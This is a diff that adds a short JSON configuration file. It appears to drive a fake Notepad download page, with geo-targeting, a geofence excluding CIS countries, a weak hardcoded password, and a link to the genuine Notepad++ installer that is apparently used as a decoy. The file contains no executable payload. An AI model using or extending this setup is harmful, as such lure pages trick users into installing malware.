@@ -1,0 +1,20 @@
+{
+  "PageStatus": "ON",
+  "Enabled": "OFF",
+  "Password": "a123",
+  "SoftwareName": "note",
+  "ZIPName": "notepad",
+  "GEO": [
+    "PA"
+  ],
+  "BlockedGEO": "AM,AZ,BY,KZ,KG,MD,RU,TJ,UZ",
+  "FileName": "wd",
+  "OS": [
+    "Windows"
+  ],
+  "PatchDownloadLinks": "https://github.com/notepad-plus-plus/notepad-plus-plus/releases/download/v8.1.4/npp.8.1.4.Installer.x64.exe",
+  "Version": "V3",
+  "AndroidLink": "aaaaa",
+  "iOSLink": "",
+  "MacOSLink": ""
+}
